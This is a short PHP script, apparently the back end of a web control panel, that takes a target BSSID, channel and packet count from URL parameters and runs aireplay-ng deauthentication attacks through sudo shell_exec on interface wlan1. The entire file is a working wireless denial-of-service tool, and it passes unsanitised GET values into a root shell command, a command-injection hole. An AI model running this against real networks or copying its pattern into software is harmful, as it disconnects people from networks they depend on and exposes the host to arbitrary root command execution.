
<?php
$bssid =  $_GET["bssid"];
$ch = $_GET["chid"];
$npk = $_GET["npk"];

$card = shell_exec('iw dev | awk \'$1=="Interface"{print $2}\' | sed -e \'2d\' ');
$message = "Monitor mode not enabled";
$moncheck = shell_exec('iwconfig wlan1 | grep Monitor | sed -e "s/Mode:/ /" | awk \'{print $1}\' | cut -b 5');
$attack = shell_exec("sudo iwconfig wlan1 channel $ch && sudo aireplay-ng -0 $npk -a $bssid wlan1");
	if ($moncheck == 1) {
		echo "<pre>$attack</pre>";
	}
	else {
	echo "<pre>$message </pre>";
	}

?>
